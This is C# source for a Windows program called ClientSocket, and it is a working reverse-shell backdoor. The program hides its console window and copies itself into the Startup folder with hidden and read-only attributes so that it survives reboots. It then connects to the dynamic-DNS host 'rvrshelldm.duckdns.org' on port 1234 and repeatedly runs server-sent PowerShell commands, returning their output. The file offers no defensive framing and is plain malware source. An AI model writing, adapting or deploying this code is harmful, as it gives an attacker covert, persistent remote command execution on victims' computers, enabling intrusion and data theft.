﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using Microsoft.PowerShell.Commands;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Diagnostics;

namespace ClientSocket
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int HIDE = 0;
        const int SHOW = 5;

        public static void HideConsole()
        {
            ShowWindow(GetConsoleWindow(), HIDE);
        }

        public static void RunAtStartup()
        {
            string runPath = Assembly.GetExecutingAssembly().Location; //AppDomain.CurrentDomain.BaseDirectory;
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string thisFile = AppDomain.CurrentDomain.FriendlyName;
            string fixedStartupPath = startupPath + @"\" + thisFile;

            if (runPath != fixedStartupPath)
            {
                try
                {
                    if (!File.Exists(fixedStartupPath))
                    {
                        File.Copy(runPath, startupPath + @"\ClientSocket.exe");
                        File.SetAttributes(startupPath + @"\ClientSocket.exe", FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.Encrypted | FileAttributes.NoScrubData | FileAttributes.NotContentIndexed);
                        Console.WriteLine("[+] File copied successfully to the StartUp folder.");
                    }
                    else
                    {
                        if (thisFile == "ClientSocket.exe")
                        {
                            if (File.Exists(fixedStartupPath))
                            {
                                Console.WriteLine("[+] Running program from the StartUp path.");
                                Process.Start(fixedStartupPath);
                                Console.WriteLine("[+] Closing program due to restart...");
                                Environment.Exit(1);
                            }
                        }
                        else
                        {
                            if (File.Exists(startupPath + @"\ClientSocket.exe"))
                            {
                                Console.WriteLine("[+] Running program from the StartUp path.");
                                Process.Start(startupPath + @"\ClientSocket.exe");
                                Console.WriteLine("[+] Closing program due to restart...");
                                Environment.Exit(1);
                            }
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Error while setting program on StartUp.");
                }
            }
        }

        public string GetResult(string cmd)
        {
            string result = "";

            RunspaceConfiguration rc = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace(rc);
            r.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = r;
            ps.AddScript(cmd);

            StringWriter sw = new StringWriter();

            Collection<PSObject> po = ps.Invoke();
            foreach(PSObject p in po)
            {
                sw.WriteLine(p.ToString());
            }

            result = sw.ToString();

            if (result == "")
            {
                return "[!] Error Occurred.";
            }

            return result;
        }

        static void Main(string[] args)
        {
            HideConsole();

            RunAtStartup();
            RunAtStartup();

            Program p = new Program();

            int BUFFER_SIZE = 2048;

            IPHostEntry hostEntry;
            hostEntry = Dns.GetHostEntry("rvrshelldm.duckdns.org");

            var ip = hostEntry.AddressList[0];

            IPAddress server_ip = ip;
            IPEndPoint ipe = new IPEndPoint(server_ip, 1234);

            Socket cs = new Socket(server_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            while (!cs.Connected)
            {
                try
                {
                    cs.Connect(ipe);
                } catch
                {
                    // Do Nothing Here
                }
            }

            Console.WriteLine("[+] Connected successfully to the server!");

            string msg;
            byte[] b = new byte[BUFFER_SIZE];


            Array.Clear(b, 0, b.Length);
            cs.Receive(b);

            msg = Encoding.ASCII.GetString(b).TrimEnd('\0');
            string result;

            while (msg != "quit")
            {
                Console.WriteLine("[+] Received from server: {0}", msg);

                result = p.GetResult(msg);

                cs.Send(Encoding.ASCII.GetBytes(result));

                Array.Clear(b, 0, b.Length);
                cs.Receive(b);

                msg = Encoding.ASCII.GetString(b).TrimEnd('\0');
            }

            cs.Close();
        }
    }
}
